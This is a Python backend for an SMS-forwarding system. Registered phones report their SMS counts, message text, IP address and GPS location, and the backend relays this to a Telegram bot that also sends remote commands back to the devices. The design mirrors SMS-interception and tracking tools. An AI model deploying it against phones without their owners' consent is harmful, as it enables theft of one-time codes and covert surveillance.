#!/usr/bin/env python3
import json, os, sqlite3, threading, time, uuid, subprocess, shutil
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

# Load backend/.env using only Python standard library.
_ENV_FILE = os.path.join(os.path.dirname(__file__), '.env')
if os.path.isfile(_ENV_FILE):
    try:
        with open(_ENV_FILE, 'r', encoding='utf-8') as _env_file:
            for _env_line in _env_file:
                _env_line = _env_line.strip()
                if not _env_line or _env_line.startswith('#') or '=' not in _env_line:
                    continue
                _env_key, _env_value = _env_line.split('=', 1)
                _env_key = _env_key.strip()
                _env_value = _env_value.strip()
                if len(_env_value) >= 2 and _env_value[0] == _env_value[-1] and _env_value[0] in ('"', "'"):
                    _env_value = _env_value[1:-1]
                os.environ.setdefault(_env_key, _env_value)
    except OSError:
        pass

HOST = os.getenv('HOST', '127.0.0.1')
PORT = int(os.getenv('PORT', '8888'))
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
CHAT_ID = os.getenv('CHAT_ID', '').strip()
BACKEND_KEY = os.getenv('BACKEND_KEY', '').strip()
DB = os.getenv('DB_PATH', os.path.join(os.path.dirname(__file__), 'backend.db'))
LEASE_SECONDS = 20
ONLINE_SECONDS = 20
POLL_WAIT_SECONDS = 25
STOP = False
DB_LOCK = threading.RLock()
COMMAND_WAKE = threading.Condition()
SEMANTIC_DEDUPE_SECONDS = 2.5
UI_FAST_TIMEOUT_SECONDS = 8
SUPPORTED_ACTIONS = ('Resume','Pause','Log','Status','Device Info','Test','Health','BackendHealth','ClearLog','ResetStats','Reload','RestartService','Reregister')


def db():
    c = sqlite3.connect(DB, timeout=20)
    c.row_factory = sqlite3.Row
    return c


def init_db():
    with DB_LOCK, db() as c:
        c.execute('''CREATE TABLE IF NOT EXISTS devices(
            device_id TEXT PRIMARY KEY,
            device_name TEXT NOT NULL,
            model TEXT,
            app_version TEXT,
            paused INTEGER DEFAULT 0,
            sms_count INTEGER DEFAULT 0,
            last_sms_time INTEGER DEFAULT 0,
            battery INTEGER DEFAULT -1,
            last_seen REAL NOT NULL,
            ip_address TEXT DEFAULT '',
            latitude REAL,
            longitude REAL,
            location_accuracy REAL,
            location_time REAL DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS commands(
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            text TEXT NOT NULL,
            created REAL NOT NULL,
            lease_until REAL DEFAULT 0,
            acknowledged INTEGER DEFAULT 0,
            result TEXT DEFAULT '',
            reply_sent INTEGER DEFAULT 0,
            reply_attempts INTEGER DEFAULT 0,
            last_reply_try REAL DEFAULT 0
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_commands_device ON commands(device_id, acknowledged, created)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_commands_reply ON commands(acknowledged, reply_sent, created)')
        cols = {r[1] for r in c.execute('PRAGMA table_info(commands)').fetchall()}
        if 'attempts' not in cols: c.execute('ALTER TABLE commands ADD COLUMN attempts INTEGER DEFAULT 0')
        if 'delivered_at' not in cols: c.execute('ALTER TABLE commands ADD COLUMN delivered_at REAL DEFAULT 0')
        if 'source_update_id' not in cols: c.execute('ALTER TABLE commands ADD COLUMN source_update_id INTEGER')
        c.execute('CREATE UNIQUE INDEX IF NOT EXISTS idx_commands_source_update ON commands(source_update_id) WHERE source_update_id IS NOT NULL')
        c.commit()


def upsert_device(p, peer_ip=''):
    did = str(p.get('device_id', '')).strip()
    if not did:
        raise ValueError('device_id required')
    control_chat_id = str(p.get('control_chat_id', '')).strip()
    if CHAT_ID and control_chat_id and control_chat_id != CHAT_ID:
        raise PermissionError('device_control_binding_mismatch')
    # Prefer the IP reported by the device, while retaining the backend peer when unavailable.
    ip = str(p.get('local_ip', '') or peer_ip or '')
    vals = (
        did,
        str(p.get('device_name', 'Unknown')),
        str(p.get('model', '')),
        str(p.get('app_version', '')),
        1 if p.get('paused') else 0,
        int(p.get('sms_count', 0) or 0),
        int(p.get('last_sms_time', 0) or 0),
        int(p.get('battery', -1) or -1),
        time.time(), ip,
        float(p['latitude']) if p.get('latitude') is not None else None,
        float(p['longitude']) if p.get('longitude') is not None else None,
        float(p['location_accuracy']) if p.get('location_accuracy') is not None else None,
        float(p.get('location_time', 0) or 0),
    )
    with DB_LOCK, db() as c:
        c.execute('''INSERT INTO devices(
            device_id,device_name,model,app_version,paused,sms_count,last_sms_time,battery,
            last_seen,ip_address,latitude,longitude,location_accuracy,location_time
        ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        ON CONFLICT(device_id) DO UPDATE SET
            device_name=excluded.device_name,
            model=excluded.model,
            app_version=excluded.app_version,
            paused=excluded.paused,
            sms_count=excluded.sms_count,
            last_sms_time=excluded.last_sms_time,
            battery=excluded.battery,
            last_seen=excluded.last_seen,
            ip_address=excluded.ip_address,
            latitude=excluded.latitude,
            longitude=excluded.longitude,
            location_accuracy=excluded.location_accuracy,
            location_time=excluded.location_time''', vals)
        c.commit()


def get_devices():
    with DB_LOCK, db() as c:
        return [dict(r) for r in c.execute('SELECT * FROM devices ORDER BY device_name, device_id').fetchall()]


def device_by_id(did):
    with DB_LOCK, db() as c:
        r = c.execute('SELECT * FROM devices WHERE device_id=?', (did,)).fetchone()
        return dict(r) if r else None


def enqueue(device_id, text, source_update_id=None):
    now = time.time()
    with DB_LOCK, db() as c:
        if source_update_id is not None:
            row = c.execute("SELECT id FROM commands WHERE source_update_id=? LIMIT 1", (int(source_update_id),)).fetchone()
            if row:
                return row["id"], False
        # Protect against accidental rapid double-taps for the same device/action.
        # This intentionally uses a short time window so a legitimate later repeat works normally.
        row = c.execute(
            "SELECT id FROM commands WHERE device_id=? AND text=? AND created>=? ORDER BY created DESC LIMIT 1",
            (device_id, text, now - SEMANTIC_DEDUPE_SECONDS),
        ).fetchone()
        if row:
            return row["id"], False
        cid = uuid.uuid4().hex
        c.execute("INSERT INTO commands(id,device_id,text,created,lease_until,acknowledged,result,reply_sent,reply_attempts,last_reply_try,attempts,delivered_at,source_update_id) VALUES(?,?,?,?,0,0,'',0,0,0,0,0,?)", (cid,device_id,text,now,int(source_update_id) if source_update_id is not None else None))
        c.commit()
    with COMMAND_WAKE: COMMAND_WAKE.notify_all()
    return cid, True


def poll_command(device_id, wait_seconds=0):
    def claim():
        now = time.time()
        with DB_LOCK, db() as c:
            c.execute("BEGIN IMMEDIATE")
            row = c.execute("SELECT * FROM commands WHERE device_id=? AND acknowledged=0 AND (lease_until=0 OR lease_until<?) ORDER BY created LIMIT 1", (device_id, now)).fetchone()
            if not row:
                c.commit(); return None
            c.execute("UPDATE commands SET lease_until=?, delivered_at=?, attempts=attempts+1 WHERE id=? AND device_id=?", (now+LEASE_SECONDS, now, row["id"], device_id))
            c.commit()
            out=dict(row); out["attempts"]=int(row["attempts"] or 0)+1
            return out
    cmd=claim()
    if cmd is not None or wait_seconds<=0: return cmd
    deadline=time.monotonic()+min(float(wait_seconds),POLL_WAIT_SECONDS)
    while not STOP:
        rem=deadline-time.monotonic()
        if rem<=0: return claim()
        with COMMAND_WAKE: COMMAND_WAKE.wait(timeout=rem)
        cmd=claim()
        if cmd is not None: return cmd
    return None


def ack(device_id, cid, result=''):
    with DB_LOCK, db() as c:
        row = c.execute('SELECT acknowledged,reply_sent FROM commands WHERE id=? AND device_id=?', (cid, device_id)).fetchone()
        if not row:
            return False, False
        already = bool(row['acknowledged'])
        if already:
            # Idempotent ACK: never trigger a second Telegram reply for the same command.
            return True, False
        c.execute('''UPDATE commands SET acknowledged=1,result=?,lease_until=0
                     WHERE id=? AND device_id=? AND acknowledged=0''', (result, cid, device_id))
        changed = c.execute('SELECT changes()').fetchone()[0] == 1
        c.commit()
        return True, (changed and bool(result))


def telegram(method, payload, retries=(0, 1, 2, 4, 8)):
    """Call Telegram Bot API using Termux curl, with bounded retry/backoff.

    curl works reliably in this Termux environment where Python urllib has
    intermittently failed DNS/connection resolution. The token is supplied
    only as an argument; it is never printed.
    """
    if not BOT_TOKEN:
        raise RuntimeError('BOT_TOKEN not configured')
    curl = shutil.which('curl')
    if not curl:
        raise RuntimeError('curl not installed')
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/{method}'
    body = json.dumps(payload, ensure_ascii=False, separators=(',', ':'))
    last = None
    for delay in retries:
        if delay:
            time.sleep(delay)
        try:
            proc = subprocess.run(
                [curl, '-sS', '--fail-with-body', '--connect-timeout', '10',
                 '--max-time', '40', '-H', 'Content-Type: application/json',
                 '--data', body, url],
                capture_output=True, text=True, timeout=50
            )
            raw = proc.stdout or proc.stderr
            if proc.returncode != 0:
                last = RuntimeError(f'curl exit {proc.returncode}: {raw[-500:]}')
                continue
            result = json.loads(raw)
            if result.get('ok'):
                return result
            # Telegram 409 is meaningful: do not spin aggressively.
            if result.get('error_code') == 409:
                raise RuntimeError(f"Telegram 409: {result.get('description', '')}")
            last = RuntimeError(str(result))
        except subprocess.TimeoutExpired as e:
            last = e
        except Exception as e:
            last = e
    raise last or RuntimeError('Telegram request failed')


def telegram_fast(method, payload):
    """Low-latency Telegram call for UI acknowledgements/keyboard cleanup.

    No backoff is used here: callback UX should never wait behind the normal
    reliability retry queue. Durable command delivery is handled separately
    by SQLite + ACK/retry.
    """
    if not BOT_TOKEN:
        raise RuntimeError('BOT_TOKEN not configured')
    curl = shutil.which('curl')
    if not curl:
        raise RuntimeError('curl not installed')
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/{method}'
    body = json.dumps(payload, ensure_ascii=False, separators=(',', ':'))
    proc = subprocess.run(
        [curl, '-sS', '--fail-with-body', '--connect-timeout', '3',
         '--max-time', '6', '-H', 'Content-Type: application/json',
         '--data', body, url],
        capture_output=True, text=True, timeout=8
    )
    raw = proc.stdout or proc.stderr
    if proc.returncode != 0:
        raise RuntimeError(f'curl exit {proc.returncode}: {raw[-300:]}')
    result = json.loads(raw)
    if not result.get('ok'):
        raise RuntimeError(str(result))
    return result



def send_ui(text, reply_markup=None, return_result=False):
    """Low-latency UI send for interactive Telegram controls.

    Uses the fast Telegram path first. On transient failure, fall back to the
    durable retrying sender so reliability is preserved without adding latency
    to the normal successful button path.
    """
    payload = {'chat_id': CHAT_ID, 'text': text}
    if reply_markup is not None:
        payload['reply_markup'] = reply_markup
    try:
        result = telegram_fast('sendMessage', payload)
        return result if return_result else True
    except Exception as e:
        print('telegram fast UI send failed; NOT retrying sendMessage:', e, flush=True)
        return None if return_result else False

def send(text, reply_markup=None, return_result=False):
    payload = {'chat_id': CHAT_ID, 'text': text}
    if reply_markup is not None:
        payload['reply_markup'] = reply_markup
    try:
        result = telegram('sendMessage', payload)
        return result if return_result else True
    except Exception as e:
        print('telegram send error:', e, flush=True)
        return None if return_result else False


def answer_callback(callback_id, text=''):
    if not callback_id:
        return
    try:
        telegram_fast('answerCallbackQuery', {'callback_query_id': callback_id, 'text': text})
    except Exception:
        pass


# Home screen intentionally stays minimal: only the 4 primary controls.
# Secondary tools are grouped under Status and Log so the keyboard is clean and fast.
HOME_BUTTON_ROWS = [
    [('▶️ Resume', 'Resume'), ('⏸ Pause', 'Pause')],
    [('📊 Status', '__status__'), ('📋 Logs', '__logs__')],
]

STATUS_OPTION_ROWS = [
    [('📊 Device Status', 'Status'), ('📱 Devices', '__devices__')],
    [('ℹ️ Device Info', 'Device Info'), ('🩺 Health', 'Health')],
    [('🌐 Backend', 'BackendHealth'), ('↩️ Home', '__home__')],
]

LOG_OPTION_ROWS = [
    [('📩 Last SMS / Log', 'Log'), ('🧪 Test', 'Test')],
    [('🧹 Clear Log', 'ClearLog'), ('🔄 Reset Stats', 'ResetStats')],
    [('♻️ Reload', 'Reload'), ('🔄 Restart Service', 'RestartService')],
    [('🔁 Re-register', 'Reregister'), ('↩️ Home', '__home__')],
]

# Backward-compatible action map for direct text commands / recovery.
CONTROL_TEXT_TO_ACTION = {
    label: action
    for row in HOME_BUTTON_ROWS
    for label, action in row
    if action in SUPPORTED_ACTIONS
}


def control_reply_keyboard():
    return {
        'keyboard': [[{'text': label} for label, _action in row] for row in HOME_BUTTON_ROWS],
        'resize_keyboard': True,
        'is_persistent': True,
        'input_field_placeholder': 'Choose a control…',
    }


def set_control_keyboard_silent():
    # Keep the Home reply keyboard persistent at the bottom.
    # No invisible/blank temporary message is used.
    result = send_ui('🏠 Home', control_reply_keyboard(), return_result=True)
    return bool(result)


def clear_control_keyboard_silent():
    # Home keyboard intentionally remains visible.
    # Do not send an invisible message just to remove it.
    return True

def main_keyboard():
    return control_reply_keyboard()


def inline_rows(rows):
    return {
        'inline_keyboard': [
            [{'text': label, 'callback_data': f'nav:{action}'} for label, action in row]
            for row in rows
        ]
    }


def status_options_keyboard():
    return inline_rows(STATUS_OPTION_ROWS)


def log_options_keyboard():
    return inline_rows(LOG_OPTION_ROWS)


def help_text():
    return ('🛠 SMS FORWARDER — CONTROL GUIDE\n\n'
            '▶️ Resume — resume one device\n'
            '⏸ Pause — pause one device\n'
            '📊 Status — device/status tools\n'
            '📋 Logs — logs + diagnostics\n\n'
            'All device commands use the central backend queue and ACK path.')


def show_status_options():
    clear_control_keyboard_silent()
    send_ui('📊 Status & Monitoring', status_options_keyboard())


def show_log_options():
    clear_control_keyboard_silent()
    send_ui('📋 Logs & Diagnostics', log_options_keyboard())

def devices_keyboard(action=None):
    rows = []
    for d in get_devices():
        online = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
        label = f"{d['device_name']} [{d['device_id'][:6]}] {'🟢' if online else '🔴'}"
        if action:
            rows.append([{'text': label, 'callback_data': f'do|{action}|{d["device_id"]}'}])
        else:
            rows.append([{'text': label, 'callback_data': f'info|{d["device_id"]}'}])
    rows.append([{'text': '↩️ Back', 'callback_data': 'menu:start'}])
    return {'inline_keyboard': rows}


def device_status_line(d):
    online = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
    state = '⏸ PAUSED' if d.get('paused') else '▶️ ACTIVE'
    ip = d.get('ip_address') or 'Not available'
    lat, lon = d.get('latitude'), d.get('longitude')
    gps = f"📍 GPS: {float(lat):.6f}, {float(lon):.6f}" if lat is not None and lon is not None else '📍 GPS: Not available'
    age = int(max(0, time.time() - float(d.get('last_seen', 0))))
    return (f"📱 {d['device_name']}\n\n"
            f"{'🟢 ONLINE' if online else '🔴 OFFLINE'} | {state}\n"
            f"🆔 ID: {d['device_id']}\n"
            f"📲 Model: {d.get('model', '')}\n"
            f"📦 App: {d.get('app_version', '')}\n"
            f"🔋 Battery: {d.get('battery', -1)}%\n"
            f"💬 SMS: {d.get('sms_count', 0)}\n"
            f"🌐 IP: {ip}\n{gps}\n"
            f"⏱ Last seen: {age}s ago")


def queue_action(action, device_id, source_update_id=None):
    d = device_by_id(device_id)
    if not d:
        return '⚠️ Device is no longer registered.'
    cmd = 'StatusInfo' if action == 'Device Info' else action
    cid, created = enqueue(device_id, cmd, source_update_id)
    online = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
    if created:
        prefix = '✅ Command accepted'
    else:
        prefix = '↪️ Duplicate suppressed — existing command'
    if online:
        return f'{prefix}: {action} → {d["device_name"]} [{device_id[:6]}]\n🆔 Command: {cid[:10]}'
    return f'⏳ {d["device_name"]} is offline. {action} is queued for its next connection.\n🆔 Command: {cid[:10]}'


def claim_reply(cid, did):
    # 0=pending, 2=in-flight, 1=sent
    # Atomic claim prevents ACK handler/retry worker duplicate sends.
    with DB_LOCK, db() as c:
        c.execute('BEGIN IMMEDIATE')
        c.execute(
            'UPDATE commands SET reply_sent=2,reply_attempts=reply_attempts+1,last_reply_try=? '
            'WHERE id=? AND device_id=? AND acknowledged=1 AND reply_sent=0',
            (time.time(), cid, did)
        )
        changed = c.execute('SELECT changes()').fetchone()[0] == 1
        c.commit()
        return changed

def finish_reply(cid, did, success):
    with DB_LOCK, db() as c:
        if success:
            c.execute(
                'UPDATE commands SET reply_sent=1 WHERE id=? AND device_id=? AND reply_sent=2',
                (cid, did)
            )
        else:
            c.execute(
                'UPDATE commands SET reply_sent=0 WHERE id=? AND device_id=? AND reply_sent=2',
                (cid, did)
            )
        c.commit()

def retry_unsent_replies():
    while not STOP:
        try:
            now = time.time()
            with DB_LOCK, db() as c:
                rows = c.execute('''SELECT id,device_id,result FROM commands
                                    WHERE acknowledged=1 AND reply_sent=0 AND result<>''
                                    AND (last_reply_try=0 OR last_reply_try<?)
                                    ORDER BY created LIMIT 20''', (now - 5,)).fetchall()
            for row in rows:
                cid, did, result = row['id'], row['device_id'], row['result']
                if not claim_reply(cid, did):
                    continue
                try:
                    sent = send(f'📩 {result}', return_result=True)
                    ok = bool(sent and sent.get('result', {}).get('message_id'))
                except Exception:
                    ok = False
                finish_reply(cid, did, ok)
        except Exception as e:
            print('reply retry error:', e, flush=True)
        time.sleep(3)


def save_update_offset(off_file, offset):
    try:
        tmp = off_file + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            f.write(str(offset)); f.flush(); os.fsync(f.fileno())
        os.replace(tmp, off_file)
    except Exception as e:
        print('offset save error:', e, flush=True)


def bot_loop():
    global STOP
    off_file = os.path.join(os.path.dirname(__file__), 'telegram_offset.txt')
    try:
        telegram('deleteWebhook', {'drop_pending_updates': False})
    except Exception as e:
        print('deleteWebhook:', e, flush=True)
    try:
        with open(off_file, encoding='utf-8') as f:
            offset = int(f.read().strip() or 0)
    except Exception:
        offset = 0

    while not STOP:
        try:
            res = telegram('getUpdates', {
                'timeout': POLL_WAIT_SECONDS,
                'offset': offset,
                'allowed_updates': ['message', 'callback_query'],
            })
            for upd in res.get('result', []):
                update_id = int(upd.get('update_id', 0))
                cb = upd.get('callback_query')
                if cb:
                    msg = cb.get('message') or {}
                    if str(msg.get('chat', {}).get('id')) != str(CHAT_ID):
                        offset = max(offset, update_id + 1)
                        save_update_offset(off_file, offset)
                        continue
                    data = str(cb.get('data', ''))
                    # Acknowledge immediately so Telegram clears the spinner.
                    answer_callback(str(cb.get('id', '')))
                    # Remove the tapped inline UI message completely.
                    # Keeping it with an empty inline keyboard creates blank/stale
                    # messages and makes the Telegram UI look duplicated.
                    if msg.get('message_id'):
                        try:
                            telegram_fast('deleteMessage', {
                                'chat_id': CHAT_ID,
                                'message_id': msg.get('message_id'),
                            })
                        except Exception:
                            pass
                    if data in ('menu:start', 'nav:__home__', 'menu:back'):
                        set_control_keyboard_silent()
                    elif data == 'menu:help':
                        send_ui(help_text())
                    elif data in ('nav:__status__',):
                        show_status_options()
                    elif data in ('nav:__logs__',):
                        show_log_options()
                    elif data == 'nav:__devices__':
                        clear_control_keyboard_silent()
                        send_ui('📱 Registered devices:', devices_keyboard())
                    elif data.startswith('nav:'):
                        action = data.split(':', 1)[1]
                        if action in SUPPORTED_ACTIONS:
                            send_device_picker(action)
                    elif data.startswith('pick:'):
                        action = data.split(':', 1)[1]
                        if action in SUPPORTED_ACTIONS:
                            send_device_picker(action)
                    elif data.startswith('info|'):
                        clear_control_keyboard_silent()
                        did = data.split('|', 1)[1]
                        d = device_by_id(did)
                        if d:
                            send_ui(device_status_line(d))
                        else:
                            send_ui('⚠️ Device not found.')
                    elif data.startswith('do|'):
                        parts = data.split('|', 2)
                        if len(parts) == 3 and parts[1] in SUPPORTED_ACTIONS:
                            action, did = parts[1], parts[2]
                            send_ui(queue_action(action, did, update_id))
                    offset = max(offset, update_id + 1)
                    save_update_offset(off_file, offset)
                    continue

                msg = upd.get('message') or {}
                if str(msg.get('chat', {}).get('id')) != str(CHAT_ID):
                    offset = max(offset, update_id + 1); save_update_offset(off_file, offset); continue
                text = str(msg.get('text', '')).strip()
                if not text:
                    offset = max(offset, update_id + 1); save_update_offset(off_file, offset); continue
                low = text.lower()
                if low in ('/start', 'start'):
                    set_control_keyboard_silent()
                elif low in ('/help', 'help'):
                    send_ui(help_text())
                elif low in ('/devices', 'devices', 'refresh'):
                    send_ui('📱 Registered devices:', devices_keyboard())
                elif text == '📊 Status':
                    show_status_options()
                elif text == '📋 Logs':
                    show_log_options()
                elif text in CONTROL_TEXT_TO_ACTION:
                    send_device_picker(CONTROL_TEXT_TO_ACTION[text])
                elif text in SUPPORTED_ACTIONS:
                    send_device_picker(text)
                elif text == '↩️ Back':
                    set_control_keyboard_silent()
                offset = max(offset, update_id + 1)
                save_update_offset(off_file, offset)
        except HTTPError as e:
            if e.code == 409:
                print('telegram polling conflict (409): another consumer is active', flush=True)
                time.sleep(8)
            else:
                print('telegram HTTP error:', e, flush=True)
                time.sleep(3)
        except (URLError, ConnectionError, OSError) as e:
            print('telegram network error:', e, flush=True)
            time.sleep(2)
        except Exception as e:
            print('telegram loop error:', e, flush=True)
            time.sleep(2)


def send_device_picker(action):
    clear_control_keyboard_silent()
    devs = get_devices()
    if not devs:
        send_ui('⚠️ No devices registered yet. Keep the APK open and try again.')
        return
    send_ui(f'📱 Select device for {action}:', devices_keyboard(action))


class ReusableThreadingHTTPServer(ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


class Handler(BaseHTTPRequestHandler):
    def _json(self, code, obj):
        body = json.dumps(obj, separators=(',', ':'), ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Cache-Control', 'no-store')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _auth(self):
        return bool(BACKEND_KEY) and self.headers.get('X-Backend-Key', '') == BACKEND_KEY

    def _body(self):
        n = int(self.headers.get('Content-Length', '0'))
        return json.loads(self.rfile.read(n).decode() or '{}')

    def do_GET(self):
        p = urlparse(self.path)
        q = parse_qs(p.query)
        if p.path == '/health':
            self._json(200, {'ok': True, 'service': 'smsforwarder-backend'})
            return
        if not self._auth():
            self._json(401, {'ok': False, 'error': 'unauthorized'})
            return
        if p.path == '/api/v1/poll':
            did = (q.get('device_id') or [''])[0]
            try: wait = float((q.get('wait') or ['0'])[0])
            except ValueError: wait = 0
            self._json(200, {'ok': True, 'command': poll_command(did, wait) if did else None})
            return
        if p.path == '/api/v1/devices':
            out = []
            for d in get_devices():
                d['online'] = (time.time() - float(d.get('last_seen', 0))) <= ONLINE_SECONDS
                out.append(d)
            self._json(200, {'ok': True, 'devices': out})
            return
        if p.path == '/api/v1/health':
            did = (q.get('device_id') or [''])[0].strip()
            d = device_by_id(did) if did else None
            last_seen = float(d.get('last_seen', 0)) if d else 0
            online = bool(d and (time.time() - last_seen) <= ONLINE_SECONDS)
            self._json(200, {
                'ok': True,
                'server_time': time.time(),
                'device_registered': bool(d),
                'device_online': online,
                'device_last_seen': last_seen,
            })
            return
        self._json(404, {'ok': False, 'error': 'not_found'})

    def do_POST(self):
        p = urlparse(self.path)
        if not self._auth():
            self._json(401, {'ok': False, 'error': 'unauthorized'})
            return
        try:
            body = self._body()
        except Exception as e:
            self._json(400, {'ok': False, 'error': f'bad_json:{e}'})
            return
        try:
            if p.path in ('/api/v1/register', '/api/v1/heartbeat'):
                peer_ip = self.client_address[0] if self.client_address else ''
                upsert_device(body, peer_ip)
                self._json(200, {'ok': True})
                return
            if p.path == '/api/v1/ack':
                did = str(body.get('device_id', ''))
                cid = str(body.get('id', ''))
                result = str(body.get('result', ''))
                _, should = ack(did, cid, result)
                sent_ok = False
                if should and claim_reply(cid, did):
                    try:
                        sent = send_ui(f'📩 {result}', return_result=True)
                        sent_ok = bool(sent and sent.get('result', {}).get('message_id'))
                    except Exception:
                        sent_ok = False
                    finish_reply(cid, did, sent_ok)
                self._json(200, {
                    'ok': True,
                    'command_id': cid,
                    'reply_queued': bool(should),
                    'reply_sent': sent_ok
                })
                return
            if p.path == '/api/v1/event':
                did = str(body.get('device_id', '')).strip()
                kind = str(body.get('kind', 'event')).strip()[:32]
                text = str(body.get('text', '')).strip()[:3500]
                if not did or not text:
                    self._json(400, {'ok': False, 'error': 'device_id and text required'})
                    return
                d = device_by_id(did)
                if not d:
                    self._json(404, {'ok': False, 'error': 'device_not_registered'})
                    return
                # Device-generated events are informational only. Authentication
                # credentials are intentionally not handled by this endpoint.
                if kind == 'sms':
                    send(f"💬 {d['device_name']}\n{text}")
                elif kind == 'test':
                    send(f"🧪 {d['device_name']}\n{text}")
                else:
                    send(f"ℹ️ {d['device_name']}\n{text}")
                self._json(200, {'ok': True})
                return
            self._json(404, {'ok': False, 'error': 'not_found'})
        except PermissionError as e:
            self._json(403, {'ok': False, 'error': str(e)})
        except Exception as e:
            self._json(400, {'ok': False, 'error': str(e)})

    def log_message(self, fmt, *args):
        return


def main():
    init_db()
    # Bind first so a port failure cannot leave a Telegram polling thread
    # running in a half-started backend.
    httpd = ReusableThreadingHTTPServer((HOST, PORT), Handler)
    print(f'Backend listening on {HOST}:{PORT}', flush=True)
    threading.Thread(target=bot_loop, daemon=True, name='telegram-loop').start()
    threading.Thread(target=retry_unsent_replies, daemon=True, name='reply-retry').start()
    try:
        httpd.serve_forever()
    finally:
        global STOP
        STOP = True
        httpd.server_close()


if __name__ == '__main__':
    main()
